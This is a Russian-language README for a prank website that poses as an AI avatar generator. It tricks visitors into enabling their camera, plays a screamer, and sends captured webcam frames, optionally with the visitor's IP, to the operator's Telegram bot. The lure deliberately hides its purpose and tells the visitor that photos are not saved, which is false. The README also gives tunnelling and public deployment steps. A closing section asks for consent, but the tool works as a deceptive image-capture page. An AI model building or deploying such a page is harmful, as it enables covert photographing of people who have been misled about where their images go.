# PixelFace AI — шуточный скример с отправкой фото в Telegram

Мини-сайт для пранка: жертва думает, что нейросеть сделает ей аватарку из фото.
Светлый дружелюбный интерфейс, приятная музыка, «рендер» — а потом резкий сбой
и скример. Кадры с камеры в этот момент улетают в твой Telegram-чат.
Фото живёт только на твоём сервере и в твоём боте.

```
интро «AI-аватарка» → рендер (камера) → сбой → скример → кадры уходят в Telegram
```

Главное в приманке: ни слова про страх. Заголовок «Аватарка из твоего фото»,
градиентная кнопка «Создать аватарку», чипы «5 секунд / 8 стилей / не сохраняем» —
жертва сама разрешает камеру, потому что это выглядит как безобидный сервис.
Слом происходит внезапно: дружелюбный рендер на 96% превращается в
«ОШИБКА: ЛИЦО НЕ РАСПОЗНАНО» → «В КАДРЕ КТО-ТО ЕЩЁ» → тишина 0.2 с → крик.
Никакого обратного отсчёта.

## Быстрый старт

```powershell
# 1. зависимости не нужны, только Node 18+
node --version

# 2. конфиг
Copy-Item .env.example .env
notepad .env            # вписать токен и chat_id

# 3. запуск
npm start               # http://localhost:3000
```

Или просто дважды кликни **start.cmd** — он сам найдёт Node (в том числе
встроенный в DSH) и поднимет сервер. Окно закрывать нельзя: оно и есть сервер.

Открой `http://localhost:3000` на ноутбуке, где есть камера, и нажми
«СОЗДАТЬ АВАТАРКУ».

## Как получить токен и chat_id

1. В Telegram напиши **@BotFather** → `/newbot` → имя и username бота.
   Получишь токен вида `1234567890:AAH...` → это `TELEGRAM_BOT_TOKEN`.
2. Напиши своему боту `/start` (иначе он не сможет тебе писать).
3. Свой числовой id узнай у **@userinfobot** → это `TELEGRAM_CHAT_ID`.
   Либо укажи `@my_channel`, если бот админ канала.

Проверить, что всё настроено: `http://localhost:3000/api/health` →
`{"ok":true,"telegram":true}`.

Быстрая проверка бота одной командой:

```powershell
npm run telegram:check
```

Скрипт проверит токен, найдёт бота, отправит тестовое сообщение в чат и
объяснит ошибку, если что-то не так (`chat not found`, `Unauthorized`,
нет связи с Telegram).

## Что приходит в Telegram

- 1–4 кадра с камеры (сняты в момент испуга, интервалы 0 / 0.28 / 0.65 / 1.15 с);
- подпись: дата, количество кадров, разрешение экрана;
- если камеру не разрешили — просто текстовое сообщение.

Хочешь галерею вместо одного фото — ничего менять не надо: при 2+ кадрах
используется `sendMediaGroup`.

## Настройки (.env)

| Переменная | Что делает |
|---|---|
| `TELEGRAM_BOT_TOKEN` | токен бота (обязательно) |
| `TELEGRAM_CHAT_ID` | куда слать: id или `@channel` (обязательно) |
| `PORT` | порт, по умолчанию 3000 |
| `HOST` | по умолчанию `0.0.0.0` |
| `APP_NAME` | подпись в сообщении |
| `SEND_IP` | `1` — добавлять IP отправителя |
| `TZ` | часовой пояс в подписи |
| `ACCESS_KEY` | необязательный ключ: отправка только по ссылке `/?key=ключ` |

## Отладка

Параметры URL (только для проверки):

- `?debug=1` — весь сценарий в 5 раз быстрее;
- `?nocam=1` — не запрашивать камеру (тест без вебки);
- `?scene=scare` — сразу показать скример;
- `?scene=glitch` — экран сбоя рендера;
- `?voice=2` — другой крик (1 женский, 2 мужской, 3 чудовище).

Страница `/voices.html` — прослушать все три и выбрать.

Ассеты (лицо, крики, мирный пад, гул, сердцебиение) сгенерированы кодом
и лежат в `public/assets`. Пересобрать:

```powershell
python tools/make_assets.py     # нужны Pillow и numpy
```

Скриншоты для проверки вёрстки (нужен Chrome/Edge):

```powershell
node tools/inspect.mjs "http://127.0.0.1:3000/" shots/intro.png
```

## Как устроен слом

| Момент | Что происходит |
|---|---|
| 0.0 с | «нейросеть» просит камеру, играет тихий пад (`ambient-happy.wav`) |
| 0–5 с | 8 дружелюбных шагов: загрузка модели, поиск лица, палитра, блики |
| 5.1 с | «почти готово…» на 96% |
| 5.1 с | резко: гул вместо пада, чёрный экран, «ОШИБКА: ЛИЦО НЕ РАСПОЗНАНО» |
| 5.9 с | «В КАДРЕ КТО-ТО ЕЩЁ» |
| 6.3 с | тишина 0.2 с |
| 6.5 с | скример + крик на всю громкость |

Тайминги меняются в `STEPS` и `runGlitch()` в `public/app.js`.

## Если Telegram не отвечает

Сервер пишет об этом прямо в браузере и в консоль:

- `Unauthorized` / `chat not found` — неверный токен или chat_id, либо бот
  не в чате (напиши ему `/start`).
- `Нет соединения с api.telegram.org` — сервер не выпускает наружу: проверь
  интернет, VPN/прокси, фаервол.
  Если нужен прокси, Node 24 умеет брать его из переменных:

  ```powershell
  $env:HTTPS_PROXY="http://127.0.0.1:8080"; $env:NODE_USE_ENV_PROXY="1"; npm start
  ```

- `Не настроен` — пустые `TELEGRAM_BOT_TOKEN` / `TELEGRAM_CHAT_ID` в `.env`.

## Крик: три варианта на выбор

Крик синтезирован кодом (не запись с микрофона): голосовой тракт из импульсного
источника с джиттером, формант «а→э», придыхания, субгармоник и реверберации.
Получилось три характера:

| Файл | Характер | Когда ставить |
|---|---|---|
| `scream.wav` = `scream-1.wav` | высокий женский, пронзительный | по умолчанию |
| `scream-2.wav` | низкий мужской рёв с хрипом | если нужен «зверь» |
| `scream-3.wav` | два голоса, октава вниз | самый жуткий |

Послушать и выбрать: открой **`/voices.html`** и нажми «Поставить этот» —
сайт откроется с `?voice=2` или `?voice=3`.

Хочешь свой крик — просто положи любой `wav`/`mp3` поверх
`public/assets/scream.wav` (или укажи другой файл в `SOUNDS` в `app.js`).

Пересобрать варианты: `python tools/make_assets.py`.
Посмотреть спектрограмму без прослушивания: `python tools/spectrogram.py public/assets/scream-1.wav shots/s.png`.

## iPhone / iPad

Safari, Chrome, Firefox и Яндекс.Браузер на iPhone работают на одном движке
WebKit, поэтому совместимость общая. Главное ограничение: **камера на iOS
открывается только по `https://`**. Если открыть по `http://192.168…`, сайт
покажет предупреждение прямо на интро, а скример сработает без фото.

### Вариант 1. Свой сертификат (локальная сеть)

```powershell
powershell -ExecutionPolicy Bypass -File tools\make-cert.ps1
start.cmd
```

Скрипт создаст `certs\local.pfx`, добавит сертификат в доверенные Windows
и напечатает адрес вида `https://192.168.0.44:3443`. Открой его на iPhone
и прими предупреждение. Чтобы камера работала без warning:

1. Перекинь `certs\local.cer` на iPhone (AirDrop или почта).
2. Настройки → Основные → VPN и управление устройством → Установить.
3. Настройки → Основные → Об этом устройстве → Доверие сертификатам → включить.

### Вариант 2. Туннель (настоящий HTTPS, проще всего)

```powershell
cloudflared tunnel --url http://localhost:3000
```

Получишь ссылку `https://что-то.trycloudflare.com` — открывай на iPhone,
ничего устанавливать не нужно. Аналогично работает `ngrok http 3000`.

### Что ещё важно на iPhone

- **Добавь на экран «Домой»** (Поделиться → На экран «Домой»): сайт откроется
  в полноэкранном режиме без адресной строки — так скример страшнее.
  Для этого есть `manifest.webmanifest` и иконка.
- **Выключи беззвучный режим.** iOS глушит звук страницы переключателем
  на боковой кнопке — крика не будет.
- Вибрации на iOS нет (`navigator.vibrate` не поддерживается) — остаются
  звук, тряска картинки и вспышка.
- Если камеру случайно запретил: Настройки → Safari → Камера → «Спросить».
- Звук разблокируется первым тапом по кнопке — это требование iOS,
  иначе браузер не даёт играть аудио.

### Совместимость

| Браузер | Камера | Звук | Полный экран |
|---|---|---|---|
| Safari iOS / Chrome iOS / Firefox iOS | только https | WebAudio | нет (PWA fullscreen) |
| Chrome / Edge / Яндекс на Android | да | да | да |
| Chrome / Edge / Firefox / Safari macOS | да | да | да |

## Почему ссылка не открывается с телефона

Сервер работает, но Windows не пускает телефон в локальную сеть: для Node нет
правила в брандмауэре, а по умолчанию входящие соединения блокируются.

**Быстрый фикс (PowerShell от имени администратора):**

```powershell
New-NetFirewallRule -DisplayName "PixelFace" -Direction Inbound -Protocol TCP -LocalPort 3000,3443 -Action Allow -Profile Private
```

После этого с телефона **в той же Wi-Fi**:

- `http://192.168.0.44:3000` — откроется, но камера не заработает (нет HTTPS);
- `https://192.168.0.44:3443` — камера заработает, только прими предупреждение
  сертификата (Подробнее → Перейти на сайт).

Если телефон в мобильном интернете, локальный адрес не подойдёт вообще —
нужен деплой ниже.

## Деплой в интернет (постоянно)

Сайт будет жить на своём домене по HTTPS, камера заработает на любом телефоне,
а фото продолжат лететь в твой Telegram. Нужен бесплатный аккаунт
[Render](https://render.com) и [GitHub](https://github.com).

В проекте уже лежит `Dockerfile` и `render.yaml` — деплой занимает ~10 минут.

1. Создай репозиторий на GitHub и загрузи туда файлы проекта
   (кнопка **Add file → Upload files**, перетащи всё, кроме `.env`, `certs`,
   `shots` и `tools/tunnel/node_modules`).
2. Зайди на Render → **New → Web Service** → подключи репозиторий.
   Render сам увидит `Dockerfile` и `render.yaml`.
3. В **Environment** добавь переменные:
   - `TELEGRAM_BOT_TOKEN` — токен бота;
   - `TELEGRAM_CHAT_ID` — твой chat_id;
   - `ACCESS_KEY` — любой секрет, например `pixelface-7821`.
4. Нажми **Deploy**. Через пару минут получишь ссылку вида
   `https://pixelface.onrender.com`.
5. Открой её с `?key=твой_ключ`: `https://pixelface.onrender.com/?key=pixelface-7821`
   — иначе сервер откажет в отправке фото (защита от чужих).

Важно:

- `ACCESS_KEY` обязателен для публичного сайта — без него кто угодно сможет
  отправлять фото в твой чат;
- бесплатный тариф Render засыпает после 15 минут простоя: первый заход
  может грузиться ~30 секунд;
- токен в браузер не попадает — отправка идёт через `POST /api/send`
  на сервере;
- HTTPS на Render включён автоматически, отдельный сертификат не нужен.

### Другие варианты

- **Railway** — то же самое, тоже читает `Dockerfile`.
- **VPS** — `docker build -t pixelface . && docker run -p 80:3000 --env-file .env pixelface`
  плюс Caddy/nginx для HTTPS.
- **Fly.io** — `fly launch`, `Dockerfile` уже готов.

Ссылку лучше не публиковать в открытый доступ: держи её для друзей.

## Важно: это пранк, а не слежка

Проект весёлый только при одном условии — человек в курсе, что его разыгрывают
(или согласился на съёмку). Поэтому:

- браузер сам спросит разрешение на камеру — без него кадров не будет;
- не используй сайт, чтобы тайно снимать людей: это нарушает приватность,
  а во многих странах ещё и закон о персональных данных (в РФ — 152-ФЗ);
- не публикуй ссылку в открытых каналах и не собирай чужие фото;
- предупреди друга после пранка и удали кадры, если он против.

## Структура

```
server.mjs              сервер: статика + /api/send → Telegram Bot API
start.cmd               запуск в один клик (Windows)
.env                    твой конфиг (не коммитится)
public/
  index.html            сцены: приманка, рендер, сбой, скример, итог
  voices.html           прослушать и выбрать крик
  styles.css            светлая приманка + тёмный скример
  app.js                камера, тайминги, захват кадров, отправка
  assets/scare.jpg      лицо для скримера (сгенерировано)
  assets/scream*.wav    три крика
  assets/ambient-happy.wav  мирный пад для приманки
  assets/ambient.wav    гул для сбоя
  assets/*.wav          сердцебиение
tools/make_assets.py    генератор картинки, криков, звуков, иконок
tools/scream_synth.py   синтез крика (форманты, джиттер, реверб)
tools/spectrogram.py    спектрограмма и метрики WAV
tools/inspect.mjs       headless-скриншоты и проверка ошибок JS
.env.example            шаблон конфига
```
